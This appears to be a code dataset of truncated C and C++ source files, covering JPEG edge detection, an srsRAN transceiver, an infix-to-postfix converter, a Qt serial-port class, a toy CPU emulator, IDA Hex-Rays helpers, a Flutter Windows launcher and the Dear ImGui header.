img[cinfo.output_scanline - 1][x].green = buffer[0][x * cinfo.output_components + 1];\n            img[cinfo.output_scanline - 1][x].blue = buffer[0][x * cinfo.output_components + 2];\n        }\n    }\n\n    jpeg_finish_decompress(&cinfo);\n    jpeg_destroy_decompress(&cinfo);\n    fclose(infile);\n}\n\nvoid saveJPEGImage(const char *filename, GrayPixel image[IMAGE_HEIGHT][IMAGE_WIDTH]) {\n    struct jpeg_compress_struct cinfo;\n    struct jpeg_error_mgr jerr;\n    FILE *outfile;\n    JSAMPROW row_pointer[1];\n    int row_stride;\n\n    if ((outfile = fopen(filename, \"wb\")) == NULL) {\n        fprintf(stderr, \"Error: Unable to open file %s for writing.\\n\", filename);\n        exit(EXIT_FAILURE);\n    }\n\n    cinfo.err = jpeg_std_error(&jerr);\n    jpeg_create_compress(&cinfo);\n    jpeg_stdio_dest(&cinfo, outfile);\n\n    cinfo.image_width = IMAGE_WIDTH;\n    cinfo.image_height = IMAGE_HEIGHT;\n    cinfo.input_components = 1;\n    cinfo.in_color_space = JCS_GRAYSCALE;\n\n    jpeg_set_defaults(&cinfo);\n    jpeg_set_quality(&cinfo, 95, TRUE);\n    jpeg_start_compress(&cinfo, TRUE);\n\n    while (cinfo.next_scanline < cinfo.image_height) {\n        row_pointer[0] = &image[cinfo.next_scanline][0].gray;\n        jpeg_write_scanlines(&cinfo, row_pointer, 1);\n    }\n\n    jpeg_finish_compress(&cinfo);\n    jpeg_destroy_compress(&cinfo);\n    fclose(outfile);\n}\n\nvoid clearStaticMemory() {\n    // Set all bytes to zero in img, grayscale, and edges arrays\n    memset(img, 0, sizeof(img));\n    memset(grayscale, 0, sizeof(grayscale));\n    memset(edges, 0, sizeof(edges));\n}\n\nint main() {\n    clock_t start, end;\n    double cpu_time_used;\n    printf(\"OpenMP version %d\\n\", _OPENMP);\n\n    loadJPEGImage(\"Large_image.jpg\");\n    start = clock();\n    grayscaleConversion();\n    sobelEdgeDetection();\n    end = clock();\n    cpu_time_used = ((double)(end - start)) / CLOCKS_PER_SEC;\n    printf(\"Time taken for edge detection: %f seconds\\n\", cpu_time_used);\n    saveJPEGImage(\"Large_image_edge.jpg\", edges);\n    \n    clearStaticMemory();\n\n    return 0;\n}\n",
    "/*\n *\n * Copyright 2021-2024 Software Radio Systems Limited\n *\n * This file is part of srsRAN.\n *\n * srsRAN is free software: you can redistribute it and/or modify\n * it under the terms of the GNU Affero General Public License as\n * published by the Free Software Foundation, either version 3 of\n * the License, or (at your option) any later version.\n *\n * srsRAN is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU Affero General Public License for more details.\n *\n * A copy of the GNU Affero General Public License can be found in\n * the LICENSE file in the top-level directory of this distribution\n * and at http://www.gnu.org/licenses/.\n *\n */\n\n#include \"ru_emulator_transceiver.h\"\n#include \"srsran/support/error_handling.h\"\n\nusing namespace srsran;\nusing namespace ether;\n\nsocket_transceiver::socket_transceiver(srslog::basic_logger&   logger_,\n                                       srsran::task_executor&  executor_,\n                                       const ether::gw_config& config)\n{\n  transmitter = std::make_unique<transmitter_impl>(config, logger_);\n  srsran_assert(transmitter, \"RU emulator failed to initialize Ethernet transmitter\");\n\n  receiver = std::make_unique<receiver_impl>(config.interface, config.is_promiscuous_mode_enabled, executor_, logger_);\n  srsran_assert(receiver, \"RU emulator failed to initialize Ethernet receiver\");\n}\n\nvoid socket_transceiver::start(ether::frame_notifier& notifier_)\n{\n  receiver->start(notifier_);\n}\n\nvoid socket_transceiver::stop()\n{\n  receiver->stop();\n}\n\nvoid socket_transceiver::send(span<span<const uint8_t>> frames)\n{\n  transmitter->send(frames);\n}\n",
    "// This program converts an infix expression to postfix notation (Reverse Polish Notation)\n\n#include <iostream> // For standard input/output operations\n#include <cstring>  // For C-string manipulation functions like strcpy, strcat\n#include <cstdlib>  // For general-purpose functions like memory allocation\n\nint top = -1; // Variable to keep track of the top of the stack\nchar stack[100] = {0}; // Stack to store operators during conversion\n\n// Function prototypes\nvoid push(const char symbol);   // Function to push an element onto the stack\nchar pop();                    // Function to pop an element from the stack\nvoid infixToPostfix(const char* infixExpression); // Function to convert infix to postfix\n\nint main() {\n    char infixExpression[100] = {0}; // Array to store the input infix expression\n\n    // Prompt the user to enter an infix expression\n    std::cout << \"\\nEnter the infix expression: \";\n    std::cin.getline(infixExpression, 80); // Read the input infix expression\n\n    infixToPostfix(infixExpression); // Call the function to convert infix to postfix\n\n    std::getchar(); // Wait for a key press before closing the program\n    return 0; // End of the program\n}\n\n// Function to push an element onto the stack\nvoid push(const char symbol) {\n    if (top == 99) {\n        std::cout << \"\\nStack is full\"; // Stack overflow condition\n    } else {\n        top++; // Increment the top index\n        stack[top] = symbol; // Place the symbol at the top of the stack\n    }\n}\n\n// Function to pop an element from the stack\nchar pop() {\n    char symbol = 0; // Initialize symbol to 0 (equivalent to '\\0' in char)\n\n    if (top == -1) {\n        std::cout << \"Stack is empty\"; // Stack underflow condition\n    } else {\n        symbol = stack[top]; // Get the top element from the stack\n        stack[top] = 0; // Reset the stack position to 0\n        top--; // Decrement the top index\n    }\n    return symbol; // Return the popped symbol\n}\n\n// Function to convert an infix expression to postfix notation\nvoid infixToPostfix(const char* infixExpression) {\n    char infixExpWithParentheses[100] = {0}; // Array to store the modified infix expression\n    char postfixExpression[100] = {0};       // Array to store the resulting postfix expression\n    char symbol[2] = {0};                    // Temporary array to store single characters\n    char temp[2] = {0};                      // Temporary array for operations\n\n    // Add opening and closing parentheses to the infix expression\n    strcpy(infixExpWithParentheses, \"(\");\n    strcat(infixExpWithParentheses, infixExpression);\n    strcat(infixExpWithParentheses, \")\");\n\n    // Iterate through each character in the modified infix expression\n    for (int i = 0; i < strlen(infixExpWithParentheses); i++) {\n        symbol[0] = infixExpWithParentheses[i]; // Get the current symbol\n\n        if (symbol[0] == '(') {\n            push(symbol[0]); // Push opening parenthesis onto the stack\n        } else if (symbol[0] == ')') {\n            symbol[0] = pop(); // Pop from stack until an opening parenthesis is found\n            while (symbol[0] != '(') {\n                strncat(postfixExpression, symbol, 1); // Add popped operators to postfix expression\n                symbol[0] = pop();\n            }\n        } else if (symbol[0] == '*' || symbol[0] == '/' || symbol[0] == '+' || symbol[0] == '-') {\n            // If the symbol is an operator, handle precedence and associativity\n            if (symbol[0] == '*' || symbol[0] == '/') {\n                temp[0] = pop();\n                while (temp[0] == '*' || temp[0] == '/') {\n                    strncat(postfixExpression, temp, 1); // Add operators to postfix expression\n                    temp[0] = pop();\n                }\n                push(temp[0]);\n            } else {\n                temp[0] = pop();\n                while (temp[0] != '(') {\n                    strncat(postfixExpression, temp, 1); // Add operators to postfix expression\n                    temp[0] = pop();\n                }\n                push(temp[0]);\n            }\n            push(symbol[0]); // Push the current operator onto the stack\n        } else {\n            strncat(postfixExpression, symbol, 1); // Add operands (numbers, variables) directly to postfix\n        }\n    }\n         // Output the current state of the postfix expression\n        std::cout << \"\\n\\nPostfix Expression: \" << postfixExpression;\n}\n",
    "/*#include \"tagged_vector.hpp\"\n\n#include \"test_util.hpp\"\n\n#include <iterator>\n#include <type_traits>\n#include <iostream>\n#include <sstream>\n#include <concepts>\n\nstruct pear_tag : tag_base {};\nstruct apple_tag : tag_base {\n    using carrier_type = int;\n};\n\nstruct not_a_tag {};\n\nvoid test_all(int r)\n{\n    std::cout << \"concept tag\"<<std::endl;\n    TEMPLATE_TYPE_1_TEST(index_carrier_type, pear_tag, true);\n    TEMPLATE_TYPE_1_TEST(index_carrier_type, apple_tag, true);\n    TEMPLATE_TYPE_1_TEST(index_carrier_type, not_a_tag, false);\n    TEMPLATE_TYPE_2_TEST(vector_class, double, pear_tag, true);\n    TEMPLATE_TYPE_2_TEST(vector_class, double, apple_tag, true);\n    TEMPLATE_TYPE_2_TEST(vector_class, double, not_a_tag, false);\n    TEMPLATE_TYPE_1_TEST(index_class, pear_tag, true);\n    TEMPLATE_TYPE_1_TEST(index_class, apple_tag, true);\n    TEMPLATE_TYPE_1_TEST(index_class, not_a_tag, false);\n    TEMPLATE_TYPE_1_TEST(range_class, pear_tag, true);\n    TEMPLATE_TYPE_1_TEST(range_class, apple_tag, true);\n    TEMPLATE_TYPE_1_TEST(range_class, not_a_tag, false);\n\n    std::cout << \"index_carrier_type\" << std::endl;\n    TYPE_TEST(index_carrier_type<pear_tag>, std::size_t);\n    TYPE_TEST(index_carrier_type<apple_tag>, int);\n\n    std::cout << \"index_class size\" << std::endl;\n    // \n    CONST_TEST(sizeof(index_class<pear_tag>), sizeof(std::size_t));\n    CONST_TEST(sizeof(index_class<apple_tag>), sizeof(int));\n\n    std::cout << \"index_class\" << std::endl;\n    // \n    index_class<apple_tag> zero_apple_index(0);\n    index_class<apple_tag> positive_apple_index(1);\n    index_class<apple_tag> negative_apple_index(-1);\n\n    VALUE_TEST(zero_apple_index.value(), 0);\n    VALUE_TEST(negative_apple_index.value(), -1);\n\n    VALUE_TEST(zero_apple_index == negative_apple_index, false);\n    VALUE_TEST(zero_apple_index != negative_apple_index, true);\n\n    OSTREAM_TEST(zero_apple_index, \"0\");\n    OSTREAM_TEST(positive_apple_index, \"1\");\n    OSTREAM_TEST(negative_apple_index, \"-1\");\n\n    std::cout << \"default-initialized index_class\" << std::endl;\n    \n    index_class<apple_tag> invalid_apple_index;\n\n    EXCEPTION_TEST(invalid_apple_index.value(), std::range_error);\n    EXCEPTION_TEST(invalid_apple_index == negative_apple_index, std::range_error);\n    EXCEPTION_TEST(invalid_apple_index != negative_apple_index, std::range_error);\n    EXCEPTION_TEST(std::cout << invalid_apple_index, std::range_error);\n    EXCEPTION_TEST(index_class<apple_tag> v(invalid_apple_index), std::range_error);\n    EXCEPTION_TEST(negative_apple_index = invalid_apple_index, std::range_error);\n\n    std::cout << \"range_class\" << std::endl;\n    // \n    range_class<apple_tag> three_apple_range(-1, 2);\n    range_class<apple_tag> four_apple_range(4);\n    range_class<pear_tag> four_pear_range(4);\n\n    EQUAL_TEST(four_apple_range, four_pear_range, false);\n\n    VALUE_TEST(four_apple_range == three_apple_range, false);\n    VALUE_TEST(four_apple_range != three_apple_range, true);\n    VALUE_TEST(four_apple_range == range_class<apple_tag>(0, 4), true);\n\n    std::cout << \"range_class iterators\" << std::endl;\n    // \n    VALUE_TEST(*four_apple_range.begin(), zero_apple_index);\n    VALUE_TEST(*three_apple_range.begin(), negative_apple_index);\n    VALUE_TEST(*++three_apple_range.begin(), zero_apple_index);\n    VALUE_TEST(*--three_apple_range.end(), positive_apple_index);\n\n    using apple_range_iterator = decltype(three_apple_range.begin());\n    using pear_range_iterator = decltype(four_pear_range.begin());\n    TYPE_TEST(apple_range_iterator::iterator_category, std::bidirectional_iterator_tag);\n    TYPE_TEST(apple_range_iterator::value_type, index_class<apple_tag>);\n    TYPE_TEST(apple_range_iterator::reference, index_class<apple_tag>);\n    TYPE_TEST(apple_range_iterator::difference_type, int);\n    TYPE_TEST(pear_range_iterator::difference_type, std::ptrdiff_t);\n    \n    CONST_TEST(std::bidirectional_iterator<apple_range_iterator>, true);// this ain't workin'\n\n    std::cout << \"vector_class\" << std::endl;\n    // \n    vector_class<double, apple_tag> apple_vector(three_apple_range);\n\n    VALUE_TEST(apple_vector.range() == three_apple_range, true);\n    VALUE_TEST(apple_vector.range() != three_apple_range, false);\n    EXCEPTION_TEST(apple_vector[invalid_apple_index], std::range_error);\n\n    std::cout << \"empty vector_class\" << std::endl;\n    // \n    vector_class<int, apple_tag> empty_apple_vector;\n    VALUE_TEST(empty_apple_vector.range(), range_class<apple_tag>(0, 0));\n}\n\nint main(int argc, char** argv)\n{\n\ttry {\n        int r = 0;\n        if (argc >= 2)\n            r = std::stoi(argv[1]);\n\n        test_all(r);\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tstd::cerr << \"Exception: \" << e.what() << std::endl;\n\t}\n\n\treturn 0;\n}*/\n",
    "#include \"cport.h\"\r\n\r\n#include <QString>\r\n\r\ncPort::cPort(QObject *parent) : QObject(parent), serial(nullptr)\r\n{\r\n    timer=new QTimer(this);\r\n    timer->setInterval(100);\r\n    QObject::connect(timer,&QTimer::timeout,this,&cPort::valinquiry);\r\n}\r\n\r\nbool cPort::connect(QString portName)\r\n{\r\n\r\n    if(serial != nullptr){\r\n        serial->close();\r\n        delete serial;\r\n    }\r\n\r\n    serial = new QSerialPort(this);\r\n    serial->setPortName(portName);\r\n    serial->setBaudRate(QSerialPort::Baud9600);\r\n    serial->setDataBits(QSerialPort::Data8);\r\n    serial->setParity(QSerialPort::NoParity);\r\n    serial->setStopBits(QSerialPort::OneStop);\r\n\r\n    if(serial->open(QIODevice::ReadWrite)){\r\n        qDebug()<<\"\u041e\u0442\u043b\u0438\u0447\u043d\u043e\";\r\n        QObject::connect(serial,&QSerialPort::readyRead,this,&cPort::dataReady);\r\n\r\n    }else\r\n    {\r\n        qDebug()<<\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f \u0441 \u043f\u043e\u0440\u0442\u043e\u043c\";\r\n    }\r\n    timer->start();\r\n    return serial->isOpen();\r\n}\r\n\r\nvoid cPort::setText(QString t1,QString t2){\r\n    text=t1,text1=t2;//\u0442\u0435\u043a\u0441\u0442 \u0434\u043b\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438 \u0441\u043e\u043f\u0440\u043e\u0442\u0438\u0432\u043b\u0435\u043d\u0438\u044f\r\n    firstCon=false;\r\n}\r\n\r\nvoid cPort::dataReady()\r\n{\r\n    if(serial->isOpen()){\r\n        parsData(serial->readAll());\r\n        return;\r\n    }\r\n}\r\n\r\n\r\n\r\nvoid cPort::parsData(QByteArray b)\r\n{\r\n    QString dataB=b;\r\n    QRegExp rx(\"[\\r]\");\r\n\r\n    QThread::msleep(50);\r\n    int pos=0;\r\n    pos=rx.indexIn(dataB,pos);\r\n    if(pos!=-1){\r\n        dataB.remove(pos,2);\r\n    }\r\n    resData=dataB;\r\n    if (resData.size()>7) resData.remove(7,19);//\u0423\u0441\u0442\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043b\u0438\u0448\u043d\u0438\u0445 \u0434\u0430\u043d\u043d\u044b\u0445, \u0435\u0441\u043b\u0438 \u043f\u0440\u0438\u0445\u043e\u0434\u044f\u0442 \u0434\u0432\u0430\u0436\u0434\u044b\r\n    if(resData.size()>4){\r\n        double volt=resData.toDouble()*10;\r\n        resData=QString::number(volt,'g',4);\r\n        //resData.push_back(\" \u0412\");\r\n        emit dataReceived();\r\n        serial->clear();\r\n    }\r\n    if(resData.size()>1) firstCon=true;//\u041f\u0435\u0440\u0432\u0430\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0431\u044b\u043b\u0430 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0430\r\n}\r\n\r\nvoid cPort::valinquiry()\r\n{\r\n    if(serial->isOpen()){\r\n        if(firstCon==false){\r\n            QString s;\r\n            s=\"*CLS\";\r\n            QString EndOfLine(\"\\r\\n\");\r\n            s+=EndOfLine;\r\n            if(text.size()<1){\r\n                text=\"10\";\r\n                text1=\"\u043a\u041e\u043c\";\r\n            }\r\n            int number=text.toDouble();\r\n            if(text1==\"\u041c\u041e\u043c\"){\r\n                text=QString::number(number*1000000);\r\n            } else if(text1==\"\u043a\u041e\u043c\") text=QString::number(number*1000);\r\n            s+=\"CONF:RES \";\r\n            s+=text;\r\n            s+=\"M\";\r\n            s+=EndOfLine;\r\n            s+=\":VAL?\";\r\n            s+=EndOfLine;\r\n            serial->write(s.toUtf8());\r\n            firstCon=true;\r\n        }else\r\n        {\r\n            QString s;\r\n            s+=\":VAL?\";\r\n            QString EndOfLine(\"\\r\\n\");\r\n            s+=EndOfLine;\r\n            serial->write(s.toUtf8());\r\n        }\r\n    }\r\n}\r\n\r\nvoid cPort::quitPort(){//\u0417\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u043f\u043e\u0440\u0442\u0430\r\n    if(serial != nullptr){\r\n        serial->close();\r\n        delete serial;\r\n        serial=nullptr;\r\n    }\r\n    emit threadQuit();\r\n}\r\n\r\ncPort::~cPort(){\r\n    if(serial != nullptr){\r\n        serial->close();\r\n        delete serial;\r\n    }\r\n        emit threadQuit();\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <iomanip>\n#include <map>\n#include <string>\n#include <termios.h>\n#include <fcntl.h>\n#include <unistd.h>\n\n#define FILE_STDIN 0 // This is the file descriptor for standard input\n\nclass RegisterFile {\nprivate:\n    std::array<uint32_t, 16> gprx; // General-purpose registers (0-15)\n    std::array<uint32_t, 3> csrx;  // Control/Status registers (0-2), status = 0, handler = 1, cause = 2\n\npublic:\n    RegisterFile() {\n        gprx.fill(0);\n        csrx.fill(0);\n    }\n\n    uint32_t getGPRX(int index) const {\n        if (index < 0 || index >= gprx.size()) {\n            throw std::out_of_range(\"Invalid GPRX register index\");\n        }\n        return gprx[index];\n    }\n\n    void setGPRX(int index, uint32_t value) {\n        if (index < 0 || index >= gprx.size()) {\n            throw std::out_of_range(\"Invalid GPRX register index\");\n        }\n        gprx[index] = value;\n    }\n\n    uint32_t getCSRX(int index) const {\n        if (index < 0 || index >= csrx.size()) {\n            throw std::out_of_range(\"Invalid CSRX register index\");\n        }\n        return csrx[index];\n    }\n\n    void setCSRX(int index, uint32_t value) {\n        if (index < 0 || index >= csrx.size()) {\n            throw std::out_of_range(\"Invalid CSRX register index\");\n        }\n        csrx[index] = value;\n    }\n\n    // void displayRegisters() const {\n    //     std::cout << \"GPRX Registers:\" << std::endl;\n    //     for (int i = 0; i < gprx.size(); i++) {\n    //         std::cout << \"GPRX[\" << i << \"]: \" << std::hex << gprx[i] << std::endl;\n    //     }\n    //     std::cout << \"CSRX Registers:\" << std::endl;\n    //     for (int i = 0; i < csrx.size(); i++) {\n    //         std::cout << \"CSRX[\" << i << \"]: \" << std::hex << csrx[i] << std::endl;\n    //     }\n    // }\n    void displayRegisters() const {\n        std::cout << \"Emulated processor state:\" << std::endl;\n        for (int i = 0; i < gprx.size(); i++) {\n            std::cout << \"r\" << i << \"=0x\" << std::setw(8) << std::setfill('0') << std::hex << gprx[i];\n            if ((i + 1) % 4 == 0) {\n                std::cout << std::endl;\n            } else {\n                std::cout << \" \";\n            }\n        }\n    }\n};\n\nstd::map<uint, uint8_t> memoryMap;\n\nstd::map<uint, uint8_t> readMemoryHexFile(const std::string& filename) {\n    std::map<uint, uint8_t> memoryMap;\n\n    std::ifstream inFile(filename);\n    if (!inFile) {\n        std::cerr << \"Error opening file for reading: \" << filename << std::endl;\n        return memoryMap;\n    }\n\n    std::string line;\n    while (std::getline(inFile, line)) {\n        if (line.empty()) continue;\n\n        // Split the line into address and data part\n        std::istringstream lineStream(line);\n        std::string addressStr, dataStr;\n        if (!(lineStream >> addressStr)) continue;  // Read address part\n\n        uint address;\n        std::stringstream ss;\n        ss << std::hex << addressStr;\n        ss >> address;\n\n        // Read the data bytes\n        while (lineStream >> dataStr) {\n            int byte;\n            std::stringstream ssData;\n            ssData << std::hex << dataStr;\n            ssData >> byte;\n\n            memoryMap[address++] = static_cast<uint8_t>(byte);\n        }\n    }\n\n    inFile.close();\n    return memoryMap;\n}\n\n//-----------------------------------------------------------------------------------\n//TERMINAL\nvoid terminal_emulation(RegisterFile* regFile){\n    uint32_t TERM_OUT = 0xFFFFFF00;\n    uint32_t TERM_IN = 0xFFFFFF04;\n\n    auto it = memoryMap.find(TERM_OUT);\n    if(it != memoryMap.end()){\n        uint8_t character = memoryMap[TERM_OUT];\n        std::cout << static_cast<char>(character);\n        std::cout.flush();\n        memoryMap.erase(TERM_OUT);\n    }\n\n    if(!(regFile->getCSRX(0) & 0x02) && !(regFile->getCSRX(0) && 0x04)) {\n        char input;\n        if(read(FILE_STDIN, &input, 1) > 0) {\n            //std::cout<<\"------------------------ISPISAN KARAKTER:------------------- \"<<static_cast<int>(input)<<std::endl;\n            memoryMap[TERM_IN] = static_cast<uint8_t>(input);\n\n            // push status\n            uint32_t val = regFile->getCSRX(0); //status\n            uint32_t byte1 = (val >> 24) & 0xFF; // highest byte\n            uint32_t byte2 = (val >> 16) & 0xFF;\n            uint32_t byte3 = (val >> 8) & 0xFF;\n            uint32_t byte4 = val & 0xFF;\n            regFile->setGPRX(14, regFile->getGPRX(14) - 4); //sp = sp - 4\n            memoryMap[regFile->getGPRX(14) + 3] = byte1;\n            memoryMap[regFile->getGPRX(14) + 2] = byte2;\n            memoryMap[regFile->getGPRX(14) + 1] = byte3;\n            memoryMap[regFile->getGPRX(14)] = byte4;\n\n            // push pc\n            val = regFile->getGPRX(15); // pc\n            byte1 = (val >> 24) & 0xFF; // highest byte\n            byte2 = (val >> 16) & 0xFF;\n            byte3 = (val >> 8) & 0xFF;\n            byte4 = val & 0xFF;\n            regFile->setGPRX(14, regFile->getGPRX(14) - 4); //sp = sp - 4\n            me",
    "/*\n    Copyright \u00a9 2017-2024 AO Kaspersky Lab\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\n    Author: Sergey.Belov at kaspersky.com\n*/\n\n// Evolution of helpers.cpp from https://github.com/nihilus/hexrays_tools\n// there is almost no original code left\n\n#include \"warn_off.h\"\n#include <hexrays.hpp>\n#include <struct.hpp>\n#include <bytes.hpp>\n#include <kernwin.hpp>\n#include <pro.h>\n#include \"warn_on.h\"\n\n#include \"helpers.h\"\n\nbool at_atoea(const char * str, ea_t * pea )\n{\n\twhile(*str && isspace(*str))\n\t\tstr++;\n\tif(str[0] == '@' && str[1] == '0' && str[2] == 'x')\n\t\treturn atoea(pea, str + 1);\n\treturn false;\n}\n\nbool strtobx(const char *str, uint8 *b)\n{\n  uint8 val;\n\n  uint8 c = *str;\n  if (c >= '0' && c <= '9')\n      val = c - '0';\n  else if (c >= 'A' && c <= 'F')\n      val = c - 'A' + 10;\n  else if (c >= 'a' && c <= 'f')\n      val = c - 'a' + 10;\n  else\n    return false;\n  val <<= 4;\n  c = *(str + 1);\n  if (c >= '0' && c <= '9')\n      val += c - '0';\n  else if (c >= 'A' && c <= 'F')\n      val += c - 'A' + 10;\n  else if (c >= 'a' && c <= 'f')\n      val += c - 'a' + 10;\n  else\n    return false;\n\n  *b = val;\n  return true;\n}\n\nsize_t get_idx_of_lvar(vdui_t &vu, lvar_t *lvar)\n{\n\treturn get_idx_of(vu.cfunc->get_lvars(), lvar);\n}\n\ntinfo_t  getType4Name(const char *name)\n{\n\tqstring newName = name;\n\tstripName(&newName);\n\tbool isPtr = true;\n\tbool isDblPtr = false;\n\tif(newName.last() == '_') {\n\t\tisPtr = false;\n\t\tnewName.remove_last();\n\t} else if(newName.length() > 2 && newName.at(0) == 'p' && newName.at(1) == '_') {\n\t\tisDblPtr = true;\n\t\tnewName.remove(0, 2);\n\t}\n\n\tconst type_t *type;\n\tconst p_list *fields;\n\ttinfo_t       t; \n\tif(get_named_type(NULL, newName.c_str(), NTF_TYPE, &type) && is_type_struct(*type)) { // for structs NTF_TYPE flag req\n\t\tt = create_typedef(newName.c_str());\n\t} else if(isPtr && get_named_type(NULL, newName.c_str(), 0, &type, &fields) && is_type_func(*type)) { // zero flag for functions\n\t\tt.deserialize(NULL, &type, &fields);\n\t}\n\tif(!t.empty() && isPtr) {\n\t\tt = make_pointer(t);\n\t\tif(isDblPtr)\n\t\t\tt = make_pointer(t);\n\t}\n\treturn t;\n}\n\n\nbool is_ea(flags64_t flg)\n{\n\tif(is64bit())\n\t\treturn is_qword(flg);\n\treturn is_dword(flg);\n}\n\nea_t get_ea(ea_t ea)\n{\n\tif(is64bit())\n\t\treturn (ea_t)get_qword(ea);\n\treturn (ea_t)get_dword(ea);\n}\n\nstruc_error_t add_struc_member_ea(struc_t *sptr, const char *fieldname, ea_t offset)\n{\n\tflags64_t flag;\n\tasize_t nbytes;\n\tif(is64bit()) {\n\t\tflag = qword_flag();\n\t\tnbytes = 8;\n\t} else {\n\t\tflag = dword_flag();\n\t\tnbytes = 4;\n\t}\n\treturn add_struc_member(sptr, fieldname, offset, flag, NULL, nbytes);\n}\n\nbool set_member_name_ex(struc_t *sptr, ea_t offset,const char *name)\n{\n\tif(set_member_name(sptr, offset, name))\n\t\treturn true;\n\tfor(int i = 1; i < 100; i++) {\n\t\tqstring newName = name;\n\t\tnewName.cat_sprnt(\"_%d\", i);\n\t\tif(!get_member_by_name(sptr, newName.c_str()))\n\t\t\treturn set_member_name(sptr, offset, newName.c_str());\n\t}\n\treturn false;\n}\n\nvoid create_type_from_size(tinfo_t* t, uint32 size)\n{\n\tt->clear();\n\tswitch (size) {\n\tcase 1:\n\t\tt->create_simple_type(BT_INT8);\n\t\tbreak;\n\tcase 2:\n\t\tt->create_simple_type(BT_INT16);\n\t\tbreak;\n\tcase 4:\n\t\tt->create_simple_type(BT_INT32);\n\t\tbreak;\n\tcase 8:\n\t\tt->create_simple_type(BT_INT64);\n\t\tbreak;\n\tcase 16:\n\t\tt->create_simple_type(BT_INT128);\n\t\tbreak;\n\tdefault:\n\t\ttinfo_t byteType;\n\t\tbyteType.create_simple_type(BT_INT8);\n\t\tt->create_array(byteType, size);\n\t}\n}\n\nvoid stripName(qstring* name)\n{\n\tif (!strncmp(name->c_str(), \"__imp_\", 6))\n\t\t\tname->remove(0, 6);\n\n\tif (!strncmp(name->c_str(), \"j_\", 2))\n\t\t  name->remove(0, 2);\n\n\tsize_t len = name->length();\n\tif (len > 2) {\n\t\tchar last = name->at(len - 1);\n\t\tif(last >= '0' && last <= '9' && name->at(len - 2) == '_')\n\t\t\tname->remove_last(2);\n\t}\n}\n\nvoid stripNum(qstring* name)\n{\n\tsize_t l = name->length();\n#if IDA_SDK_VERSION < 830\n\t//strip \"i64\" suffix\n\tif(l > 3 && !qstrcmp(name->c_str() + l - 3, \"i64\")) {\n\t\tl -= 3;\n\t\tname->resize(l);\n\t}\n#else\n\t//strip \"LL\" suffix\n\tif(l > 2 && !qstrcmp(name->c_str() + l - 2, \"LL\")) {\n\t\tl -= 2;\n\t\tname->resize(l);\n\t}\n#endif\n\t//strip \"u\" suffix\n\tif(l > 1 && name->at(l - 1) == 'u') {\n\t\tname->resize(l - 1);\n\t}\n}\n\nint namecmp(const char* name, const char* cmpWith)\n{\n\tsize_t len = qstrlen(name);\n\tif (len > 2 && name[len - 1] >= '0' && name[len - 1] <= '9' && name[len - 2] == '_')\n\t\tlen -= 2;\n\tif (len > 1 && (name[len - 1] == 'A' || name[len - 1] == 'W'))\n\t\t--len;\n\treturn strncmp(name, cmpWith, ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bmi_calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.75 WIP\n// (main code and documentation)\n\n// Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp for demo code.\n// Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// Get latest version at https://github.com/ocornut/imgui\n// Releases change-log at https://github.com/ocornut/imgui/releases\n// Technical Support for Getting Started https://github.com/ocornut/imgui/wiki\n// Gallery (please post your screenshots/video there!): https://github.com/ocornut/imgui/issues/2847\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but interfaces need your support to sustain development and maintenance.\n// Businesses: you can support continued maintenance and development via support contracts or sponsoring, see docs/README.\n// Individuals: you can support continued maintenance and development via donations or Patreon https://www.patreon.com/imgui.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR 